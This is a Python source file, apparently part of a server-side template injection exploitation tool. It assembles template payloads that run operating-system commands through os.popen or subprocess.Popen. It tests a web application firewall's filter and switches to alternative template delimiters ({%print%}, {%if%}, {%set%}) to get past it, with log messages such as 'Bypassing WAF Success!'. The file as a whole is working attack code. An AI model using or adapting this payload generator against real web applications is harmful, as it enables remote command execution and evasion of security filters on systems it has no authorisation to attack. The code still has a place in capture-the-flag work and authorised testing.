from . import pattern
from .int_vars import get_useable_int_vars
import logging
logger = logging.Logger('[SSTI ShellCmd]')

def set_int_vars(waf_func):
    (ints, var_names, payload) = get_useable_int_vars(waf_func)
    if len(ints) == 0:
        logger.warning('No IntVars For YOU!')
    pattern.vars_str = payload
    pattern.number_dict = dict(zip(ints, var_names))

def exec_cmd_payload(waf_func, cmd):
    set_int_vars(waf_func)
    will_print = True
    if waf_func('{{'):
        outer_pattern = '{{PAYLOAD}}'
    elif waf_func('{%print()%}'):
        logging.warning('{{ is being waf, using {%print()%}!')
        outer_pattern = '{%print(PAYLOAD)%}'
    elif waf_func('{%if()%}{%endif%}'):
        will_print = False
        logging.warning('{{ is being waf, no execute result for you!')
        outer_pattern = '{%if(PAYLOAD)%}{%endif%}'
    elif waf_func('{% set x= %}'):
        will_print = False
        logging.warning('{{ is being waf, no execute result for you!')
        outer_pattern = '{% set x=PAYLOAD %}'
    else:
        logging.warning('LOTS OF THINGS is being waf, NOTHING FOR YOU!')
        return (None, None)
    types = [pattern.OSPopenPattern1, pattern.OSPopenPattern2, pattern.SubprocessPopenPattern1]
    for t in types:
        mod = t(cmd)
        ret = mod.test_requirements(waf_func)
        if ret:
            logger.info('Bypassing WAF Success!')
            payload = outer_pattern.replace('PAYLOAD', mod.payload)
            if pattern.should_set_abcd:
                payload = pattern.vars_str + payload
            return (payload, will_print)
    logger.warning('Bypassing WAF Failed.')
    return (None, None)